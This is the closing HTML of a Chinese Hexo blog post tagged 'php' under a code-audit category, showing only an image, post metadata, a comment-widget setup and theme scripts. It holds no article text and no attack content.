<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233152.png" alt="image-20240116223318053"></p>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2024-01-16</span>
            
                <span>该篇文章被 v2ish1yan</span>
            
            
                <span>打上标签:
                    
                    
                        <a href='/tags/php/'>
                            php
                        </a>
                    
                </span>
             
             
                <span>归为分类:
                    
                    
                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
                            代码审计
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // 禁止表情包搜索
                reaction: false, // 对文章打分
                pageview: false, // 浏览量统计
                comment: false, // 评论数统计

                locale: {
                    placeholder: '欢迎评论', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            © 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--这是指一条线往下的内容-->
<div class="footer-last">
    
            <span>🌊面朝大海，春暖花开🌸</span>
            
                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--回到顶部按钮-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--目录-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- 回到顶部的按钮-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--暗黑模式-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: '🌓', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>